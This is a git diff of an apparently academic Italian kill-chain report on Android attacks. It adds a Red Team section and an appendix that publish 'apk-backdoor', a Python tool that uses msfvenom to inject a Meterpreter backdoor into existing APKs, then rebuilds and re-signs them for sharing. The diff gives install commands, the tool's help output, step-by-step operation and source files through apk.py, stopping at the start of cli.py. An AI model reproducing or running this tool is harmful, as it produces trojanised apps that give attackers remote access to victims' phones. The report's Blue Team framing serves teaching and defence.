@@ -445,13 +445,69 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <ul class="sectlevel1">
 <li><a href="#_killchain">1. Killchain</a>
 <ul class="sectlevel2">
-<li><a href="#reconnaissance">1.1. Reconnaissance</a></li>
-<li><a href="#weaponization">1.2. Weaponization</a></li>
-<li><a href="#delivery">1.3. Delivery</a></li>
-<li><a href="#exploit">1.4. Exploit</a></li>
-<li><a href="#installation">1.5. Installation</a></li>
-<li><a href="#command-and-control">1.6. Command &amp; Control</a></li>
-<li><a href="#action">1.7. Action</a></li>
+<li><a href="#reconnaissance">1.1. Reconnaissance</a>
+<ul class="sectlevel3">
+<li><a href="#reconnaissance-red-team">1.1.1. Red Team</a></li>
+<li><a href="#reconnaissance-blue-team">1.1.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#weaponization">1.2. Weaponization</a>
+<ul class="sectlevel3">
+<li><a href="#weaponization-red-team">1.2.1. Red Team</a>
+<ul class="sectlevel4">
+<li><a href="#_requisiti">Requisiti</a></li>
+<li><a href="#_il_tool">Il tool</a></li>
+<li><a href="#_il_funzionamento_del_tool">Il funzionamento del tool</a></li>
+</ul>
+</li>
+<li><a href="#weaponization-blue-team">1.2.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#delivery">1.3. Delivery</a>
+<ul class="sectlevel3">
+<li><a href="#delivery-red-team">1.3.1. Red Team</a></li>
+<li><a href="#delivery-blue-team">1.3.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#exploit">1.4. Exploit</a>
+<ul class="sectlevel3">
+<li><a href="#exploit-red-team">1.4.1. Red Team</a></li>
+<li><a href="#exploit-blue-team">1.4.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#installation">1.5. Installation</a>
+<ul class="sectlevel3">
+<li><a href="#installation-red-team">1.5.1. Red Team</a></li>
+<li><a href="#installation-blue-team">1.5.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#command-and-control">1.6. Command &amp; Control</a>
+<ul class="sectlevel3">
+<li><a href="#command-and-control-red-team">1.6.1. Red Team</a></li>
+<li><a href="#command-and-control-blue-team">1.6.2. Blue Team</a></li>
+</ul>
+</li>
+<li><a href="#action">1.7. Action</a>
+<ul class="sectlevel3">
+<li><a href="#action-red-team">1.7.1. Red Team</a></li>
+<li><a href="#action-blue-team">1.7.2. Blue Team</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#appendix-red-team-tool">Appendix A: Codice sorgente: il tool</a>
+<ul class="sectlevel2">
+<li><a href="#appendix-red-team-tool-setup">A.1. File: setup.py</a></li>
+<li><a href="#_modulo_apk_backdoor">A.2. Modulo: apk_backdoor</a>
+<ul class="sectlevel3">
+<li><a href="#appendix-red-team-tool-init">A.2.1. File: __init__.py</a></li>
+<li><a href="#appendix-red-team-tool-main">A.2.2. File: __main__.py</a></li>
+<li><a href="#appendix-red-team-tool-apk">A.2.3. File: apk.py</a></li>
+<li><a href="#appendix-red-team-tool-cli">A.2.4. File: cli.py</a></li>
+<li><a href="#appendix-red-team-tool-payload">A.2.5. File: payload.py</a></li>
+<li><a href="#appendix-red-team-tool-utilities">A.2.6. File: utilities.py</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="#_riferimenti">Riferimenti</a></li>
@@ -515,6 +571,249 @@ quindi accesso ai dispositivi sui quali è installata e aperta.</p>
 <h4 id="weaponization-red-team">1.2.1. Red Team</h4>
 <div class="paragraph text-center">
 <p>&#8220;<em>Preparazione dell&#8217;applicazione modificata</em>&#8221;</p>
+</div>
+<div class="sect4">
+<h5 id="_requisiti">Requisiti</h5>
+<div class="paragraph">
+<p>Per poter proseguire con l&#8217;attacco, sono necessari alcuni prerequisiti software.</p>
+</div>
+<div class="paragraph">
+<p>Non è necessario alcun sistema operativo particolare per eseguire i comandi
+(benché sia molto consigliato utilizzare un sistema operativo Linux, come
+<strong>Kali</strong> o <strong>Ubuntu</strong>). Tutto quel che è descritto in questo documento è stato
+scritto e testato su <strong>Ubuntu 19.10 (Eoan Ermine)</strong>.</p>
+</div>
+<div class="paragraph">
+<p>Per iniziare, è necessario installare e/o aggiornare il framework <strong>Metasploit</strong>.
+Su <em>Kali Linux</em>, questo tool è già preinstallato e per aggiornarlo basta
+eseguire i seguenti comandi:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade <span class="nt">-y</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Su <em>Ubuntu</em> (o altre distribuzioni) è invece necessario installarlo dal suo
+codice sorgente. Le istruzioni sono comunque disponibili all&#8217;interno della loro
+repository, all&#8217;indirizzo <a href="https://github.com/rapid7/metasploit-framework" class="bare">https://github.com/rapid7/metasploit-framework</a>.</p>
+</div>
+<div class="paragraph">
+<p>Successivamente è necessario installare il tool <code>zipalign</code> (utilizzato durante
+la fase di firma dell&#8217;APK). Tale tool, se non precedentemente installato, è
+installabile mediante i seguenti comandi:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> zipalign</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>È inoltre necessario installare <strong>Python 3.7</strong> (o superiore). Oggigiorno le
+distribuzioni Linux citate hanno l&#8217;interprete preinstallato. Tuttavia, qualora
+fosse necessario, Python e il suo <em>package manager</em> <strong>PIP</strong> possono essere
+installati eseguendo:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install </span>python3 python3-pip <span class="nt">-y</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Ulteriori dipendenze da installare sono quelle dei tool installati fin&#8217;ora, ma
+sono già elencate sui loro siti web o installate automaticamente (con il comando
+<code>apt install</code>) ed è quindi superfluo riportarle.</p>
+</div>
+<div class="paragraph">
+<p>Inoltre, il tool è dipendente da ApkTool
+(<a href="https://ibotpeaches.github.io/Apktool/" class="bare">https://ibotpeaches.github.io/Apktool/</a>) e ApkSigner
+(<a href="https://developer.android.com/studio/command-line/apksigner" class="bare">https://developer.android.com/studio/command-line/apksigner</a>), tuttavia tali
+eseguibili sono stati inclusi all&#8217;interno del programma scritto e non è quindi
+necessaria una loro installazione.</p>
+</div>
+<div class="paragraph">
+<p>Una dipendenza non necessaria, ma consigliata, è KeyTool
+(<a href="https://docs.oracle.com/en/java/javase/12/tools/keytool.html" class="bare">https://docs.oracle.com/en/java/javase/12/tools/keytool.html</a>), utilizzato per
+creare il database di chiavi con cui firmare l&#8217;APK. Un database di debug è stato
+già incluso all&#8217;interno del tool e non è quindi necessario l&#8217;installazione di
+KeyTool, ma qualora si volessero modificare le chiavi nel database, è necessaria
+la sua installazione.</p>
+</div>
+<div class="paragraph">
+<p>Le versioni dei tool con cui il programma scritto è stato testato sono le
+seguenti:</p>
+</div>
+<div class="hdlist">
+<table>
+<tr>
+<td class="hdlist1">
+Metasploit Framework
+</td>
+<td class="hdlist2">
+<p>versione <code>5.0.75-dev-8167fee11e</code></p>
+</td>
+</tr>
+<tr>
+<td class="hdlist1">
+Python
+</td>
+<td class="hdlist2">
+<p>versione 3.7.5</p>
+</td>
+</tr>
+<tr>
+<td class="hdlist1">
+Pip
+</td>
+<td class="hdlist2">
+<p>versione 18.1 (per Python 3)</p>
+</td>
+</tr>
+<tr>
+<td class="hdlist1">
+Zipalign
+</td>
+<td class="hdlist2">
+<p><em>Unknown</em></p>
+</td>
+</tr>
+<tr>
+<td class="hdlist1">
+ApkTool
+</td>
+<td class="hdlist2">
+<p>versione 2.4.0</p>
+</td>
+</tr>
+<tr>
+<td class="hdlist1">
+ApkSigner
+</td>
+<td class="hdlist2">
+<p>versione 0.8</p>
+</td>
+</tr>
+</table>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_il_tool">Il tool</h5>
+<div class="paragraph">
+<p>I comandi da eseguire al fine di includere una backdoor in un APK sono diversi,
+e richiedono alcune azioni manuali. Poiché ci si occupa di gestire un
+meta-attacco, è impensabile riprodurre numerose volte le stesse azioni su APK
+differenti. Per questo motivo si è deciso di creare un tool che automatizzasse
+la creazione del malware.</p>
+</div>
+<div class="paragraph">
+<p>Il codice sorgente di tale tool, per non appensantire questa sezione del
+documento, è riportato in <a href="#appendix-red-team-tool">Appendix A</a>.</p>
+</div>
+<div class="paragraph">
+<p>L&#8217;installazione è semplicissima: basta eseguire i seguenti comandi:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">git clone https://github.com/espositoandrea/CyberSecurity.git
+<span class="nb">cd </span>CyberSecurity/src
+pip3 <span class="nb">install</span> .</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>In questo modo il tool sarà installato e disponibile nella variabile <code>PATH</code> di
+sistema. Il programma si presenta in questo modo:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code>andrea@laptop:~$ apk-backdoor -h
+usage: apk-backdoor [-h] [-v] [--host HOST] [--public_host PUBLIC_HOST]
+                    [--meterpreter-config {Y,N}]
+                    [-V {CRITICAL,ERROR,WARN,INFO,DEBUG}]
+                    APK
+
+Inject a meterpreter backdoor in an existing APK
+
+positional arguments:
+  APK                   The APK where the backdoor will be injected
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -v, --version         show program's version number and exit
+  --host HOST, -H HOST  The host (in the form IP:PORT) to which the payload
+                        will send data
+  --public_host PUBLIC_HOST, -p PUBLIC_HOST
+                        The host (in the form IP:PORT) to which the payload
+                        will send data. Use this if HOST is in a private
+                        network: REAL_HOST will be the router's public IP (and
+                        the port that the router will forward to the
+                        attacker's machine)
+  --meterpreter-config {Y,N}, -m {Y,N}
+                        Whether or not a meterpreter configuration file should
+                        be written.It can then be used with 'msfconsole -r
+                        config_file'
+  -V {CRITICAL,ERROR,WARN,INFO,DEBUG}, --verbose {CRITICAL,ERROR,WARN,INFO,DEBUG}
+                        Verbosity level (between 1 and 5 occurrences with more
+                        leading to a more verbose logging). CRITICAL = 0,
+                        ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Come comprensibile, il programma richiede un APK in cui iniettare la backdoor e
+dispone di una serie di opzioni che ne consentono la configurazione da riga di
+comando.</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_il_funzionamento_del_tool">Il funzionamento del tool</h5>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Il programma, al suo avvio, ottiene un riferimento all&#8217;APK target, in modo da
+poterlo utilizzare al suo interno.</p>
+</li>
+<li>
+<p>Se non forniti mediante interfaccia da riga di comando, il programma richiede
+l&#8217;immissione dell&#8217;IP privato dell&#8217;host a cui inviare i dati una volta avviata la
+backdoor</p>
+<div class="olist loweralpha">
+<ol class="loweralpha" type="a">
+<li>
+<p>Se l&#8217;attacco è da compiere su rete WAN, deve essere utilizzata l&#8217;interfaccia
+da riga di comando e deve essere fornito l&#8217;IP pubblico mediante l&#8217;opzione <code>-p</code></p>
+</li>
+</ol>
+</div>
+</li>
+<li>
+<p>È eseguito il comando <code>msfvenom</code> per iniettare la backdoor all&#8217;interno
+dell&#8217;APK (si veda <a href="#appendix-red-team-tool-payload">Section A.2.5</a> per il comando completo).
+Poiché l&#8217;APK non funziona a dovere sin da questo punto, è necessario apportarvi
+delle modifiche</p>
+</li>
+<li>
+<p>L&#8217;APK generato viene decompilato con ApkTool (si veda
+<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
+</li>
+<li>
+<p>Viene iniettato all&#8217;interno del Manifest dell&#8217;APK decompilato una riga XML che
+consente l&#8217;uso dei permessi richiesti sui dispositivi Android più recenti</p>
+</li>
+<li>
+<p>È ricompilato l&#8217;APK modificato con ApkTool (si veda
+<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
+</li>
+<li>
+<p>L&#8217;APK viene riallineato con ZipAlign (si veda <a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
+</li>
+<li>
+<p>L&#8217;APK appena ricompilato è firmato con ApkSigner (si veda
+<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>A questo punto l&#8217;APK infetto è pronto e può essere condiviso.</p>
+</div>
 </div>
 </div>
 <div class="sect3">
@@ -589,10 +888,10 @@ creazione del malware.</p>
 <div class="paragraph">
 <p>Come già detto, durante la creazione del malware si è incluso all&#8217;interno
 dell&#8217;APK una porzione di codice che apra <strong>automaticamente</strong> la <em>backdoor</em>
-all&#8217;apertura dell&#8217;applicazione modificata. Per questo motivo non è richiesta
-alcuna azione da parte dell&#8217;attaccante al fine di installare il malware, già
-installato e attivato <strong>autonomamente</strong> dalla vittima e non è richiesta alcuna
-azione esterna.</p>
+all&#8217;apertura dell&#8217;applicazione modificata (si veda <a href="#weaponization-red-team">Section 1.2.1</a>).
+Per questo motivo non è richiesta alcuna azione da parte dell&#8217;attaccante al fine
+di installare il malware, già installato e attivato <strong>autonomamente</strong> dalla
+vittima e non è richiesta alcuna azione esterna.</p>
 </div>
 </div>
 <div class="sect3">
@@ -721,6 +1020,566 @@ sempre attiva in background.</p>
 </div>
 </div>
 <div class="sect1">
+<h2 id="appendix-red-team-tool">Appendix A: Codice sorgente: il tool</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Di seguito si riporta il codice sorgente del tool sviluppato.</p>
+</div>
+<div class="sect2">
+<h3 id="appendix-red-team-tool-setup">A.1. File: setup.py</h3>
+<div class="paragraph">
+<p>Questo file permette l&#8217;installazione del tool.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
+<span class="kn">from</span> <span class="nn">apk_backdoor</span> <span class="kn">import</span> <span class="n">__version__</span> <span class="k">as</span> <span class="n">version</span>
+
+<span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s">'apk_backdoor'</span><span class="p">,</span>
+    <span class="n">version</span><span class="o">=</span><span class="n">version</span><span class="p">,</span>
+    <span class="n">description</span><span class="o">=</span><span class="s">'Create a backdoor and inject it to an existing APK.'</span><span class="p">,</span>
+    <span class="n">url</span><span class="o">=</span><span class="s">'https://github.com/espositoandrea/CyberSecurity'</span><span class="p">,</span>
+    <span class="n">author</span><span class="o">=</span><span class="s">'Andrea Esposito'</span><span class="p">,</span>
+    <span class="n">author_email</span><span class="o">=</span><span class="s">'esposito_andrea99@hotmail.com'</span><span class="p">,</span>
+    <span class="n">packages</span><span class="o">=</span><span class="p">[</span><span class="s">'apk_backdoor'</span><span class="p">],</span>
+    <span class="n">package_data</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'apk_backdoor'</span><span class="p">:</span> <span class="p">[</span>
+            <span class="s">'tools/apktool.jar'</span><span class="p">,</span>
+            <span class="s">'tools/apksigner.jar'</span><span class="p">,</span>
+            <span class="s">'tools/debug.keystore'</span><span class="p">,</span>
+        <span class="p">]</span>
+    <span class="p">},</span>
+    <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span>
+        <span class="s">'colorama'</span>
+    <span class="p">],</span>
+    <span class="n">entry_points</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'console_scripts'</span><span class="p">:</span> <span class="p">[</span>
+            <span class="s">'apk-backdoor = apk_backdoor.cli:main'</span>
+        <span class="p">]</span>
+    <span class="p">}</span>
+<span class="p">)</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_modulo_apk_backdoor">A.2. Modulo: apk_backdoor</h3>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-init">A.2.1. File: __init__.py</h4>
+<div class="paragraph">
+<p>File di definizione del modulo (richiesto).</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="n">__version__</span> <span class="o">=</span> <span class="s">'1.0.0'</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-main">A.2.2. File: __main__.py</h4>
+<div class="paragraph">
+<p>File che permette l&#8217;esecuzione del modulo mediante il comando <code>python3 -m apk_backdoor</code>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">from</span> <span class="nn">.cli</span> <span class="kn">import</span> <span class="n">main</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-apk">A.2.3. File: apk.py</h4>
+<div class="paragraph">
+<p>Questo file gestisce gli APK e la loro decompilazione, compilazione e firma.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>
+
+<span class="kn">import</span> <span class="nn">pkg_resources</span>
+
+<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
+<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>
+
+
+<span class="k">class</span> <span class="nc">Apk</span><span class="p">:</span>
+    <span class="n">APKTOOL_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
+        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/apktool.jar'</span>
+    <span class="p">)</span>
+    <span class="n">APKSIGNER_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
+        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/apksigner.jar'</span>
+    <span class="p">)</span>
+    <span class="n">KEYSTORE_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
+        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/debug.keystore'</span>
+    <span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">'Creating the APK representation (using {path})'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">full_path</span> <span class="o">=</span> <span class="n">path</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">path</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="nb">dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">def</span> <span class="nf">decompile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"java -jar {self.APKTOOL_PATH} d -f -o {self.apk_name} {self.full_path}"</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Decompiling '{self.apk_name}.apk'..."</span><span class="p">)</span>
+        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done.'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">"Decompiled to '{self.decompiled_path}'"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">get_main_activity</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">'The APK must be decompiled first'</span><span class="p">)</span>
+
+        <span class="n">ANDROID_NAME</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}name'</span>
+        <span class="n">INTENT_MAIN</span> <span class="o">=</span> <span class="s">'android.intent.action.MAIN'</span>
+        <span class="n">INTENT_LAUNCHER</span> <span class="o">=</span> <span class="s">'android.intent.category.LAUNCHER'</span>
+        <span class="n">tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">))</span>
+        <span class="n">application</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span>
+        <span class="n">activities</span> <span class="o">=</span> <span class="n">application</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'activity'</span><span class="p">)</span>
+        <span class="n">main_activity</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="k">for</span> <span class="n">activity</span> <span class="ow">in</span> <span class="n">activities</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">intent_filter</span> <span class="ow">in</span> <span class="n">activity</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'intent-filter'</span><span class="p">):</span>
+                <span class="n">actions</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">intent_filter</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'action'</span><span class="p">)</span> <span class="k">if</span> <span class="n">a</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span> <span class="o">==</span> <span class="n">INTENT_MAIN</span><span class="p">]</span>
+                <span class="n">categories</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">intent_filter</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'category'</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span> <span class="o">==</span> <span class="n">INTENT_LAUNCHER</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">actions</span> <span class="ow">and</span> <span class="n">categories</span><span class="p">:</span>
+                    <span class="n">main_activity</span> <span class="o">=</span> <span class="n">activity</span>
+                    <span class="k">break</span>
+            <span class="k">if</span> <span class="n">main_activity</span><span class="p">:</span>
+                <span class="k">break</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">main_activity</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">RuntimeError</span><span class="p">(</span><span class="s">'No Main Activity found'</span><span class="p">)</span>
+
+        <span class="n">name</span> <span class="o">=</span> <span class="n">main_activity</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">name</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">name</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'.'</span><span class="p">,</span> <span class="s">'/'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'.smali'</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">remove_decompiled</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Building modified target's APK"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">'The APK must be decompiled first'</span><span class="p">)</span>
+
+        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">'java -jar {self.APKTOOL_PATH} b -o {self.apk_name}_MOD.apk {self.decompiled_path}'</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">'Recompiling {self.apk_name} to {os.getcwd()}...'</span><span class="p">)</span>
+        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done'</span><span class="p">)</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Signing modified target's APK"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Signing '{self.apk_name}_MOD.apk'..."</span><span class="p">)</span>
+
+        <span class="c1"># command = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {self.KEYSTORE_PATH} -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {self.apk_name}_SIGNED.apk androiddebugkey"
+</span>        <span class="c1"># utilities.run_command(command)
+</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">'zipalign -f -v 4 {self.apk_name}_MOD.apk {self.apk_name}_SIGNED.apk'</span>
+        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span> <span class="o">+</span> <span class="s">'_MOD.apk'</span><span class="p">)</span>
+
+        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"java -jar {self.APKSIGNER_PATH} sign --ks {self.KEYSTORE_PATH} --ks-key-alias androiddebugkey -ks-pass pass:android {self.apk_name}_SIGNED.apk"</span>
+        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done.'</span><span class="p">)</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-cli">A.2.4. File: cli.py</h4>
+<div class="paragraph">
+<p>Questo file definisce l&#8217;interfaccia da riga di comando (CLI) del tool.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">namedtuple</span>
+
+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
+
+<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">__version__</span>
+<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
+<span class="kn">from</span> <span class="nn">.apk</span> <span class="kn">import</span> <span class="n">Apk</span>
+<span class="kn">from</span> <span class="nn">.payload</span> <span class="kn">import</span> <span class="n">Payload</span>
+<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>
+
+
